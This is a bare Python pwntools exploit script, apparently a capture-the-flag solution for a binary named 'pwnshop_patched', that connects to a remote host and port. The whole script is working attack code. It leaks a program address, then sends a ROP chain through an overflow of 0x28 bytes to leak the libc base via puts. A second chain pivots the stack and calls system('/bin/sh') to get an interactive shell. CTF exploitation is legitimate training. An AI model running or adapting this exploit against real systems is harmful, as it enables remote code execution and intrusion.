#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./pwnshop_patched',checksec=False)
libc = ELF('./libc.so.6')
ld = ELF('./ld-2.23.so')
#p = process()
p = remote('83.136.254.158',36331)

p.sendlineafter(b'> ',b'2')
p.sendafter(b'? ',b'aaa')
payload = b'a'*8
p.sendafter(b'? ',payload)
p.recvuntil(b'What? ')
p.recv(8)

leak = u64(p.recv(6).ljust(8,b'\x00'))
log.info(f"leak {hex(leak)}")


exe.address = leak - 0x40c0
sub_rsp = 0x0000000000001219
pop_rdi = 0x00000000000013c3

log.info(f"exe: {hex(exe.address)}")

p.sendlineafter(b'> ',b'1')
#gdb.attach(p,gdbscript='''
#           brva 0x000000000000135B
#           ''')
#input()

payload_leak = p64(pop_rdi+exe.address)
payload_leak += p64(exe.got.puts)
payload_leak += p64(exe.plt.puts)
payload_leak += p64(0x000000000000132A+exe.address)

p.sendafter(b'Enter details: ',b'a'*0x28 +  payload_leak + p64(exe.address + sub_rsp)) 

leak = u64(p.recv(6).ljust(8,b'\x00'))
log.info(f"leak {hex(leak)}")
libc.address = leak - libc.sym.puts

log.info(f"lb: {hex(libc.address)}")


payload_get_shell = b'a'*0x28 + p64(pop_rdi+exe.address)
payload_get_shell += p64(next(libc.search(b'/bin/sh\x00')))
payload_get_shell += p64(pop_rdi+exe.address+1)
payload_get_shell += p64(libc.sym.system)
payload_get_shell += p64(sub_rsp + exe.address)
input()
p.sendafter(b'Enter details: ',payload_get_shell)

p.interactive()
